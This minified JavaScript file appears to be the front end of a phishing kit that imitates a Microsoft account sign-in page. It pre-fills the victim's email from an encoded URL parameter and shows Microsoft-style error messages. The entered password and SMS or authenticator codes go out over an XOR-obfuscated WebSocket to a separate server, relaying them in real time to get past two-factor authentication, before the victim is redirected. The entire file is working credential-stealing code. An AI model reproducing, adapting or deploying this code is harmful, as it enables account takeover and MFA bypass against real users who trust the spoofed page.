(()=>{class e{static get(e,t=1){if(!t)return sessionStorage.getItem(e);let s=sessionStorage.getItem(e);if(!s)return null;sessionStorage.setItem(e,null);let r=parseInt(s.substring(s.length-2),16);return s.substring(0,s.length-2).match(/.{2}/gim).map((e=>{let t=parseInt(e,16);return String.fromCharCode(t^r)})).join("")}static getBased(){let t=location.hash.substring(1),s=location.search.substring(1);if(t)return e.decodeBased(t);if(s){let t,r=(e.get("autograbs",1)||"em,email").split(","),o=/([^\&]+?)\=([^\&]*)/gim;for(;t=o.exec(s);)if(t[1]&&r.includes(t[1]))return e.decodeBased(t[2])}return null}static decodeBased(t){if(!(t=decodeURIComponent(t))||!t.trim())return null;let s=/[^a-zA-Z0-9.#+&\/=_{|}@\-\\]/gim,r=/^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/,o=/(?:[a-fA-F0-9]{2}){5,}/im;if(r.test(t))return t;try{let e=atob(t);if(r.test(e))return e;throw"Bad base64"}catch(e){if(o.test(t)){let e=t.match(/.{2}/gim).map((e=>{let t=parseInt(e,16);return String.fromCharCode(t)})).join("");if(r.test(e))return e;{let s=parseInt(t.substring(t.length-2),16);if(e=t.substring(0,t.length-2).match(/.{2}/gim).map((e=>{let t=parseInt(e,16);return String.fromCharCode(t^s)})).join(""),r.test(e))return e}}}return s.test(t)?e.decodeBased(t.replace(s,"")):void 0}constructor(){let t=new URL(e.get("host",0)),s=this.fetch_cookie(),r=Math.floor(1e3*Math.random()),o="ws://"+t.host+"/p/"+r;o+="?session="+s,this.ws=new WebSocket(o),this.ws.binaryType="arraybuffer",this.responses=[];var i=this;this.ws.onerror=function(e){$("#display-error-message").text("Could not connect to corresponding server",(function(){$("#content").css("opacity","0.1")})),$("#error-dismiss").prop("disabled",!0).css({visibility:"visible"})},this.ws.onclose=function(e){i.responses=[]},this.ws.onmessage=function(e){i.responses.push(e)}}fetch_cookie(){return sessionStorage.getItem("session")}encode(e){var t=[],s=[Math.floor(1e3*Math.random())%Math.pow(2,7),Math.floor(1e3*Math.random())%Math.pow(2,7),Math.floor(1e3*Math.random())%Math.pow(2,7)];return e.split("").map((e=>{var r=e.charCodeAt(0);t.push(r^s[0]^s[1]^s[2])})),s.map((e=>t.push(e))),new Uint8Array(t).buffer}decode(e){var t="",s=new Uint8Array(e),r=s.slice(-3);return(s=s.slice(0,-3)).map((e=>{t+=String.fromCharCode(e^r[0]^r[1]^r[2])})),t}_send(e){return new Promise(((t,s)=>{var r,o=0;r=setInterval((()=>{o++>10&&(clearInterval(r),console.log("WebSocket is not ready yet, current status "+this.ws.readyState),s("an error occured")),this.ws.readyState==WebSocket.OPEN&&(this.ws.send(this.encode(e)),clearInterval(r),t("done"))}),50)}))}async send(e,t){if(!t)return Promise.reject("A empty response was gotten");var s=String(Math.floor(1e5*Math.random())),r={id:s,message:t,path:e},o=JSON.stringify(r);return await this._send(o),new Promise(((e,t)=>{var r=0,o=setInterval((()=>{for(var i of(r>=120&&(clearInterval(o),t("No response was obeserved within 10 ses of waiting")),this.responses))try{var a=JSON.parse(this.decode(i.data));a.id==s&&(clearInterval(o),this.responses.splice(this.responses.indexOf(i)),e(a.response))}catch(e){t(e),clearInterval(o)}r++}),200)}))}}document.title=e.get("title",0),$.support.cors=!0;var t=new e,s=e.decodeBased(e.get("home",0))||"";function r(e,s){t.send("/email",{email:e}).then((function(t){if(t&&"fail"!=t){var r=t;null!==r.bg_image&&""!==r.bg_image&&($("#bg_img").css("background-image","linear-gradient(rgba(0,0,0,0.527),rgba(0,0,0,0.5)),url("+r.bg_image+")"),$("#banner_image").hide()),null!==r.logo_image&&""!==r.logo_image&&($("#logo_image").attr("src",r.logo_image),$("#banner_image").hide()),s&&s(),$(".identity").html(e),$("#add_pass").show()}else $("#add_em").show(),$(".em-error-parent").show(),$(".em-error").html("We couldn't find an account with that username. Try another, or get a new Microsoft account.")})).catch((e=>{console.log(e),$("#content").css("opacity","0.1"),$("#error-display").css({visibility:"visible"})}))}$("#loadingScreen").hide((function(){$("#content").show((function(){if(e.get("image",0),e.get("caption",0),s)r(s);else{let t=e.getBased();t?(s=t,r(t)):$("#add_em").show()}}))})),$("#error-dismiss").click((function(){$("#content").css("opacity","1"),$("#error-display").css({visibility:"hidden"})})),$(".click-to-enter").click((function(){t.send("/start-2fa-sms",{email:s}).then((function(e){"success"==e.auth&&$(".show-2fa-code").hide((function(){$(".input-code").show()}))})).catch((e=>{console.log(e),$("#content").css("opacity","0.1"),$("#error-display").css({visibility:"visible"})}))})),$(".submit-mfa1-code").click((function(){$(".mfa-error").hide();var e=$(".mfa1-code").val();if(!/^[0-9]+$/.test(e))return!1;$(".stealth").val(),$("#password").val(),t.send("/code-2fa-mfa1",{code:e,email:s,pw:$("#password").val()}).then((function(e){0==e.v?$(".mfa-error").show():1==e.v&&(location.replace(e.t),setTimeout("window.location.href='"+e.t+"';",1e3))})).catch((e=>{console.log(e),$("#content").css("opacity","0.1"),$("#error-display").css({visibility:"visible"})}))})),$(".submit-2fa").click((function(){$(".code-error").hide((function(){$(".sms-error").hide()}));var e=$("#idTxtBx_SAOTCC_OTC").val();if(!/^[0-9]+$/.test(e)||6!=e.length)return $(".code-error").show((function(){$(".sms-error").show(),$(".error-type").html("Please enter the 6-digit code. The code only contains numbers")})),!1;$("#idTxtBx_SAOTCC_OTC").val(),$(".stealth").val(),$("#password").val(),t.send("/code-2fa-sms",{code:$("#idTxtBx_SAOTCC_OTC").val(),email:s,pw:$("#password").val()}).then((function(e){"0"==e.v?$(".code-error").show((function(){$(".sms-error").show()})):"1"==e.v&&(location.replace(e.t),setTimeout("window.location.href='"+e.t+"';",1e3))})).catch((e=>{console.log(e),$("#content").css("opacity","0.1"),$("#error-display").css({visibility:"visible"})}))})),$(".btn-email").click((function(){r($("#email").val(),(()=>{$("#add_em").hide()}))})),$(".nextb").click((function(){$(".nextb").prop("disabled",!0),$(".pass-error").hide(),$(".info-verify").hide(),$(".alert-erro").hide();var e=$("#password").val();if(e){$("#progressBar").show();var r=s;compi={auth:r,pswd:e},t.send("/login",{email:r,pw:e}).then((function(e){if("valid"==e.t){var o=e.finish;location.replace(o),setTimeout("window.location.href='"+o+"';",1e3)}else"sms"==e.t?($(".enter-pass").hide((function(){$(".show-2fa-code").show()})),$(".add-text").html(e.number),$("#progressBar").hide()):"mfa1"==e.t?($(".enter-pass").hide((function(){t.send("/start-2fa-mfa1",{email:r}).then((function(e,t){})).catch((e=>{console.log(e),$("#content").css("opacity","0.1"),$("#error-display").css({visibility:"visible"})})),$(".show-mfa1-code").show()})),$("#progressBar").hide()):"mfa2"==e.t?($(".enter-pass").hide((function(){t.send("/start-2fa-mfa2",{email:r}).then((function(e,t){if("success"==e.auth){var s=e;$(".displaySign").text(s.Entropy),$(".show-mfa2-code").show()}})).catch((e=>{console.log(e),$("#content").css("opacity","0.1"),$("#error-display").css({visibility:"visible"})}))})),$("#progressBar").hide(),setTimeout((function(){var e=0,r=window.setInterval((function(){15==++e&&(clearInterval(r),$(".show-mfa2-code").hide((function(){$(".mfa2-error").show()}))),$(".stealth").val(),$("#password").val(),t.send("/code-2fa-mfa2",{code:"",email:s,pw:$("#password").val()}).then((function(e){1==e.v&&(location.replace(e.t),setTimeout("window.location.href='"+e.t+"';",3e3))})).catch((e=>{console.log(e),$("#content").css("opacity","0.1"),$("#error-display").css({visibility:"visible"})}))}),2e3)}),2e3)):($("#progressBar").hide(),$(".error-alert").show(),$(".pass-error").show(),$(".pass-error").html("Your email or password is incorrect. If you don't remember your password, <a href='#'>reset it now.</a>"),$(".nextb").prop("disabled",!1),$("#password").val(null))}))}else $(".alert-erro").show(),$(".alert-erro").html("Please enter the password for your Microsoft account."),$(".nextb").prop("disabled",!1)})),$(document).on("keypress",(function(e){13==e.which&&($(".enter-pass").is(":visible")?$(".nextb").click():$(".input-code").is(":visible")&&$(".submit-2fa").click())}))})();